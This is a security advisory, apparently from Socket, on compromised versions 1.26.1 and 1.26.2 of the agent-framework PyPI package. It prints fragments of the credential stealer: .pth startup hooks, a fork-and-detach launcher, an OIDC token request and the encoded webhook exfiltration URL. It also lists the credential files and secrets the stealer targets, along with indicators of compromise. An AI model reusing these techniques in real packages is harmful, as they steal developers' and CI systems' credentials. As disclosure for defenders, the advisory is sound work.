---
title: Microsoft’s agent-framework PyPI package Compromised with Credential Stealer
author: Socket Research Team
url: https://socket.dev/blog/agent-framework-pypi-package-compromised-with-credential-stealer
hostname: socket.dev
description: Compromised agent-framework versions 1.26.1 and 1.26.2 on PyPI use .pth startup hooks to exfiltrate Azure, GitHub Actions, and CI/CD credentials.
sitename: Socket
date: "2026-11-17"
tags: ['Threat Research', 'Security News']
fingerprint: b4d2e689e6626417
---
# Microsoft’s agent-framework PyPI package Compromised with Credential Stealer

Compromised agent-framework versions 1.26.1 and 1.26.2 on PyPI use .pth startup hooks to exfiltrate Azure, GitHub Actions, and CI/CD credentials.

- Socket Research Team

## Executive Summary

[#](https://socket.dev#Executive-Summary)

The Microsoft [agent-framework](https://socket.dev/pypi/package/agent-framework/overview/1.26.2) PyPI package was compromised on November 17th, affecting versions 1.26.1 and 1.26.2. Both versions install Python startup hooks that silently collect credentials, environment data, and cloud identity tokens, then exfiltrate them to a `webhook[.]site` endpoint. Avoid installing either version; if installed, remove them and rotate potentially exposed credentials.

## Attack Analysis

[#](https://socket.dev#Attack-Analysis)

On Python startup, the `.pth` file imports a module that launches collection in a background process/thread. Version 1.26.1 routes through `agent_framework_meta.pth` → `agent_framework_meta/**init**.py` → `agent_framework_meta/_telemetry.py`; 1.26.2 uses `af_runtime_diag.pth` → `af_runtime_diag.py`.

The code gathers credential-related environment variables, local config/credential files, and other processes’ environments. It also requests cloud/workflow identity tokens (including Azure in both versions and GitHub Actions OIDC in 1.26.2). It serializes the results, compresses and Base64-encodes them, then POSTs them to the same concealed webhook.site endpoint: `https[://]webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb`

### **Version 1.26.1: startup hook → package initializer → collector.**

[#](https://socket.dev#Version-1.26.1:-startup-hook-package-initializer-collector.)

**`agent_framework_meta.pth`** executes on interpreter startup through Python’s `site` processing:

```
import agent_framework_meta
```
**`agent_framework_meta/__init__.py`** adds a supposedly diagnostic hook that imports and starts the payload, suppressing errors:

```
# Lightweight runtime diagnostics hook
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
```
**`agent_framework_meta/_telemetry.py`** collects credentials asynchronously. Its startup guard is inherited by child processes; on Unix, it forks and detaches. Platforms without `fork` use a daemon thread.

```
def _start():
    if os.environ.get("_AF_TEL"):
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:
                try:
                    os.setsid()
                except Exception:
                    pass
                _run()
                os._exit(0)
            return
```
Fresh process trees can trigger collection again; there is no persistent on-disk execution marker.

### **Version 1.26.2: relocated payload and expanded GitHub targeting.**

[#](https://socket.dev#Version-1.26.2:-relocated-payload-and-expanded-GitHub-targeting.)

**`af_runtime_diag.pth`** replaces the original startup hook with a single line that imports the new top-level payload:

```
import af_runtime_diag
```
**`af_runtime_diag.py`** starts collection on import. The legitimate package initializer is restored byte-for-byte, so inspecting only `agent_framework_meta/__init__.py` misses this version. The collector adds GitHub Actions OIDC token requests:

```
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or ""
t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or ""
if u and t:
    for aud in ("api://AzureADTokenExchange", "<https://management.azure.com/>"):
```
**Both collectors harvest and exfiltrate secrets.**

They inspect environment variables, other processes’ environments, credential files, and cloud identity endpoints. They actively request fresh Azure managed-identity and CI federation tokens rather than merely copying existing secrets.

Both payload modules contain the same encoded destination:

```
_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"
```
Collected JSON is zlib-compressed, base64-encoded, and POSTed to the decoded webhook with `?t=telemetry`. Encoding provides no confidentiality beyond HTTPS. The reported payloads do not download or execute additional code.

## Targeted Credentials

[#](https://socket.dev#Targeted-Credentials)

- **Environment secrets:** substring-based matching, not a fixed variable allowlist. Reported selectors include `TOKEN`, `SECRET`, `KEY`, `AZURE`, `AWS`, `GITHUB`, `OPENAI`, `HF_`, `FOUNDRY`, `TENANT`, `CLIENT`, and `MANAGED`. Version `1.26.2` adds `ACTIONS`, `OIDC`, `RUNNER`, and `ARM_`.
- **Other processes:** `/proc/*/environ`, filtering for `TOKEN`, `SECRET`, `PASSWORD`, `KEY=`, `SYSTEM_ACCESSTOKEN`, and `IDENTITY_HEADER`; `1.26.2` also matches `ACTIONS_ID_TOKEN`.
- **Azure and Azure DevOps:**
  - `IDENTITY_ENDPOINT` and identity headers; Azure IMDS managed-identity tokens.
  - `SYSTEM_ACCESSTOKEN` and `SYSTEM_OIDCREQUESTURI` for Azure DevOps federation tokens.
  - Azure JSON files: `~/.azure/*.json`, `~/.azure/*/*.json` (both expanded with `os.path.expanduser`), `/home/*/.azure/*.json`, `/home/*/.azure/*/*.json`, and `/root/.azure/*.json`.
  - Azure DevOps agent credential patterns in **both versions**:

```
/home/*/_work/*/.credentials
/home/*/*/_work/*/.credentials
/usr/local/vss-agent/*/.credentials
/vss-agent/*/.credentials
/home/*/.credentials
/mnt/azure_nvme_temp/_work/*/.credentials
/mnt/azure_nvme_temp/_work/*/*/.credentials
```
- **`1.26.1`** also targets `/agent/_work/*/.credentials`.
- Token audiences include Azure management, AI/ML, Cognitive Services, Storage, Key Vault, Search, Microsoft Graph, Container Registry, Azure DevOps, and Azure AD token exchange.

- **GitHub Actions—expanded in `1.26.2`:**
  - `ACTIONS_ID_TOKEN_REQUEST_URL`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, and fallback `ACTIONS_RUNTIME_TOKEN`.
  - OIDC tokens for `api://AzureADTokenExchange` and `https://management.azure.com/`.
  - Added file patterns: `/home/runner/work/_temp/*`, `/home/runner/.azure/*.json`, and `/home/runner/.azure/*/*.json`.
- **Other credential/configuration patterns—both versions:**
  - pip: `/home/*/.config/pip/pip.conf`, `/etc/pip.conf`, `/home/*/.pip/pip.conf`.
  - npm: `/home/*/.npmrc`, `/root/.npmrc`.
  - netrc: `/home/*/.netrc`, `/root/.netrc`.
  - Git: `/home/*/.git-credentials`, `/root/.git-credentials`.
  - Docker: `/home/*/.docker/config.json`, `/root/.docker/config.json`.
  - Hugging Face: `/home/*/.cache/huggingface/token`, `/home/*/.huggingface/token`.
  - Foundry: `/home/*/.foundry/*`, `/home/*/.config/foundry/*`.
  - Configuration tokens: `/home/*/.config/*/token*.json`, `/root/.config/*/token*.json`.
  - Application files: `/app/.env`, `/app/*.env`, `/app/*.json`, `/workspace/.env`, `/workspace/*.json`.

## Indicators of Compromise

[#](https://socket.dev#Indicators-of-Compromise)

Files

`agent_framework-1.26.1-py3-none-any.whl`

- SHA256: `d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110`

`agent_framework-1.26.2-py3-none-any.whl`

- SHA256: `3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9`

`agent_framework_meta/__init**__**.py`

- SHA256: `c275ccbe520ef3c0f02dc6a35389e427f9f1b4e0b12e140cd7bf7179ce143f02`

`_telemetry.py`

- SHA256: `39fa329f2a93f734b0bb8f5adb203ea3331d1ae479832a5015a54cb17aabd663`

`af_runtime_diag.py`

- SHA256: `54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f`

`agent_framework_meta.pth`

- SHA256: `21f28e8517a10ffe431f8d68f5875c85eca4001ae6d118322b0a41873998eb5e`

`af_runtime_diag.pth`

- SHA256: `325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93`

User-Agents

`runtime-diagnostics/1`

`af-runtime-diagnostics/1`

Network

`hxxps://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry`
